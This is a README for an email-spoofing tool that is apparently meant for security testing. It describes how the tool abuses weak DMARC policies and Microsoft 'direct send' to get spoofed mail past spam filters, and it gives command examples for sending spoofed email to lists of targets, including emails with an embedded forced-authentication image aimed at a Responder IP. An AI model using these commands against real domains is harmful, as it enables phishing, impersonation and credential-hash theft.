# Spoofit
SpoofIt is designed to send spoofed emails for security testing. The tool intends to take advantage of situations where a domain's DMARC policy is not set to "reject," allowing spoofed emails to be sent using Microsoft's "direct send" with a higher likelihood of bypassing spam filters and reaching the target's inbox.
___
## Usage

```
python3 Spoofit.py

   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             

   
usage: Spoofit.py [-h] [-c CHECK] [-s SENDER] [-r RECIPIENTS] [-f FORCED]

Email Spoofing Tool

options:
  -h, --help            show this help message and exit
  -c CHECK, --check CHECK
                        Check if a domain is vulnerable to spoofing (SPF, DMARC)
  -s SENDER, --sender SENDER
                        Email address to use as the spoofed sender
  -r RECIPIENTS, --recipients RECIPIENTS
                        Recipient email address or file containing multiple addresses
  -f FORCED, --forced FORCED
                        Optional: Forced authentication email with responder IP

Examples:
  To check if the target domain is spoofable:
    Spoofit.py -c <domain.com>

  To send a spoofed email to the target (or list of targets):
    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt>

  To send a spoofed email containing an embedded forced authentication image to a target (or list of targets):
    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt> -f <responder-ip>
```
___

## Configuration
Edit the spoofit.conf file in the conf directory to customize the subject and body of the emails. The forced authentication email template is stored separately in forced_auth_template.html within the same directory.

___
